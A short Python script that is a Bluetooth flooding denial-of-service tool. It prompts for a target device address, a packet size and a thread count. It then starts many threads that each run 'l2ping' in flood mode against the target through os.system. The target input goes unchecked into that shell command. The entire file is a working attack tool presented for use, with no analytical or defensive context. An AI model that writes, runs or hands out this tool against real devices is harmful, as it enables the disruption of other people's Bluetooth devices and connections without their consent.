import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def main():
    time.sleep(0.1)
    target_addr = input('Target addr > ')

    if len(target_addr) < 1:
        print('[!] ERROR: Target addr is missing')
        exit(0)

    try:
        packages_size = int(input('Packages size > '))
    except:
        print('[!] ERROR: Packages size must be an integer')
        exit(0)
    try:
        threads_count = int(input('Threads count > '))
    except:
        print('[!] ERROR: Threads count must be an integer')
        exit(0)
    print('')
    # os.system('clear')

    for i in range(0, threads_count):
        print('[*] Built thread №' + str(i + 1))
        threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

    print('[*] Built all threads...')
    print('[*] Starting...')
if __name__ == '__main__':
    try:
        # os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
